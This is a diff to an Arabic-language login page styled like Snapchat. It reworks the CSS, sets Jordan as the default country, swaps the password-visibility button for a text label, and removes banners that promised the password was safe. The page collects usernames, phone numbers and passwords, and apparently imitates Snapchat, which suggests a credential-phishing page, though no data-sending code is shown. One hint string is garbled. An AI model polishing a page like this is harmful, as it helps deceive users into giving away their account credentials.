@@ -24,7 +24,6 @@
     :root {
       --primary: #fffc00;
       --primary-dark: #e8eb00;
-      --secondary: #34c759;
       --bg: #ffffff;
       --card: #fafafa;
       --text: #000000;
@@ -165,15 +164,15 @@
     }
 
     .snap-logo {
-      width: 90px;
-      height: 90px;
+      width: 70px;
+      height: 70px;
       margin: 32px auto 28px;
       background: linear-gradient(135deg, var(--primary), #ffed4e);
-      border-radius: 24px;
+      border-radius: 20px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 56px;
+      font-size: 42px;
       box-shadow: 0 12px 40px rgba(255, 252, 0, 0.3);
       animation: logoBounce 2.5s ease-in-out infinite;
     }
@@ -265,36 +264,17 @@
       cursor: pointer;
       background: var(--card);
       flex: 0 0 auto;
-      padding: 16px 12px;
-      min-width: 90px;
+      padding: 16px 8px;
+      min-width: 60px;
       text-align: center;
       font-weight: 600;
+      font-size: 24px;
     }
 
     .country-select:focus {
       background: var(--bg);
       border-color: var(--primary);
       box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
-    }
-
-    .info-box {
-      background: rgba(52, 199, 89, 0.08);
-      border: 1.5px solid var(--secondary);
-      border-radius: var(--radius-md);
-      padding: 14px;
-      margin-bottom: 24px;
-      font-size: 13px;
-      color: var(--secondary);
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-      font-weight: 500;
-    }
-
-    .info-icon {
-      flex-shrink: 0;
-      font-size: 18px;
-      margin-top: 0px;
     }
 
     .form-hint {
@@ -315,7 +295,7 @@
     }
 
     .form-hint.success {
-      color: var(--secondary);
+      color: #34c759;
     }
 
     .btn {
@@ -392,6 +372,17 @@
     .toggle-mode:active {
       background: var(--glass);
       border-color: var(--text-muted);
+    }
+
+    .password-toggle-label {
+      font-size: 13px;
+      color: var(--primary);
+      font-weight: 700;
+      cursor: pointer;
+      white-space: nowrap;
+      padding: 0 8px;
+      user-select: none;
+      -webkit-user-select: none;
     }
 
     /* Modal */
@@ -656,9 +647,9 @@
       }
 
       .snap-logo {
-        width: 80px;
-        height: 80px;
-        font-size: 48px;
+        width: 70px;
+        height: 70px;
+        font-size: 42px;
       }
 
       .btn {
@@ -703,11 +694,6 @@
               <p class="page-subtitle">أدخل اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف</p>
             </div>
 
-            <div class="info-box">
-              <div class="info-icon">✓</div>
-              <div>حسابك آمن معنا - لن نطلب كلمة المرور هنا</div>
-            </div>
-
             <!-- Username/Email Mode (Default) -->
             <div id="userEmailMode">
               <div class="form-group">
@@ -716,7 +702,7 @@
                   <input 
                     id="primary" 
                     type="text" 
-                    placeholder="أدخل اسمك أو بريدك الإلكتروني"
+                    placeholder="أدخل اسم المستخدم أو البريدك"
                     autocomplete="off"
                     inputmode="latin"
                   />
@@ -731,7 +717,7 @@
                 <label class="form-label">رقم الهاتف</label>
                 <div class="input-wrapper">
                   <button id="countryBtn" class="country-select" type="button" aria-label="اختر الدولة">
-                    <span id="countryFlag">🇸🇦</span>
+                    <span id="countryFlag">🇯🇴</span>
                   </button>
                   <input 
                     id="phoneInput" 
@@ -770,11 +756,6 @@
               <p class="page-subtitle" id="userDisplay">username</p>
             </div>
 
-            <div class="info-box">
-              <div class="info-icon">✓</div>
-              <div>كلمة المرور آمنة معنا تماماً</div>
-            </div>
-
             <div class="form-group">
               <label class="form-label" for="password">كلمة المرور</label>
               <div class="input-wrapper">
@@ -784,14 +765,7 @@
                   placeholder="أدخل كلمة المرور"
                   autocomplete="off"
                 />
-                <button 
-                  id="togglePassword" 
-                  type="button" 
-                  style="position: absolute; right: 12px; background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 20px; padding: 0; display: flex; align-items: center;"
-                  aria-label="إظهار/إخفاء كلمة المرور"
-                >
-                  👁️
-                </button>
+                <label id="passwordToggleLabel" class="password-toggle-label" for="togglePassword">إظهار</label>
               </div>
               <div class="form-hint" id="hintPassword"></div>
             </div>
@@ -840,10 +814,10 @@
   <script>
     // ==================== CONFIG ====================
     const COUNTRIES = [
+      { name: 'الأردن', code: 'JO', dial: '+962', flag: '🇯🇴' },
       { name: 'السعودية', code: 'SA', dial: '+966', flag: '🇸🇦' },
       { name: 'الإمارات', code: 'AE', dial: '+971', flag: '🇦🇪' },
       { name: 'مصر', code: 'EG', dial: '+20', flag: '🇪🇬' },
-      { name: 'الأردن', code: 'JO', dial: '+962', flag: '🇯🇴' },
       { name: 'الكويت', code: 'KW', dial: '+965', flag: '🇰🇼' },
       { name: 'قطر', code: 'QA', dial: '+974', flag: '🇶🇦' },
       { name: 'البحرين', code: 'BH', dial: '+973', flag: '🇧🇭' },
@@ -883,7 +857,7 @@
     const primaryInput = document.getElementById('primary');
     const phoneInput = document.getElementById('phoneInput');
     const passwordInput = document.getElementById('password');
-    const togglePasswordBtn = document.getElementById('togglePassword');
+    const passwordToggleLabel = document.getElementById('passwordToggleLabel');
 
     const toggleBtn = document.getElementById('toggleBtn');
     const toggleText = document.getElementById('toggleText');
@@ -1023,7 +997,7 @@
       const password = passwordInput.value;
 
       if (!password) {
-        showHint(hintPassword, '❌ أدخل كلمة المرور', 'error');
+        showHint(hintPassword, '❌ ��دخل كلمة المرور', 'error');
         return null;
       }
 
@@ -1070,6 +1044,8 @@
 
       state.credentials = null;
       passwordInput.value = '';
+      passwordInput.type = 'password';
+      passwordToggleLabel.textContent = 'إظهار';
       hintPassword.textContent = '';
     }
 
@@ -1267,10 +1243,11 @@
       if (e.key === 'Enter' && !state.isLoading) sendBtn.click();
     });
 
-    togglePasswordBtn.addEventListener('click', () => {
+    passwordToggleLabel.addEventListener('click', (e) => {
+      e.preventDefault();
       const type = passwordInput.type === 'password' ? 'text' : 'password';
       passwordInput.type = type;
-      togglePasswordBtn.textContent = type === 'password' ? '👁️' : '🙈';
+      passwordToggleLabel.textContent = type === 'password' ? 'إظهار' : 'إخفاء';
     });
 
     forgotBtn.addEventListener('click', () => {
